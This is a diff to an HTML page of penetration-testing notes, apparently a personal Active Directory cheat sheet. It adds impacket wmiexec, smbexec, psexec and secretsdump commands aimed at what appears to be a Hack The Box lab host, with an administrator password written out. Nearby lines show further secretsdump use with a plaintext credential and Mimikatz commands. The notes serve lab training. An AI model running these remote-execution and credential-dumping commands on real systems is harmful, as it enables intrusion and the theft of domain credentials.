@@ -984,6 +984,14 @@ impacket-psexec -k -no-pass domain/administrator@&lt;IP&gt;</code></pre>
   <pre class="code"><code>impacket-secretsdump -just-dc domain.htb/administrator@&lt;DC_IP&gt; -hashes :&lt;hash&gt;
 impacket-secretsdump Eric.Wallows:EricLikesRunning800@192.168.220.159
 
+impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.4.15
+
+impacket-smbexec active.htb/administrator:Ticketmaster1968@10.129.4.15
+
+impacket-psexec active.htb/administrator:Ticketmaster1968@10.129.4.15
+
+impacket-secretsdump active.htb/administrator:Ticketmaster1968@10.129.4.15
+    
 # Mimikatz
 privilege::debug
 log
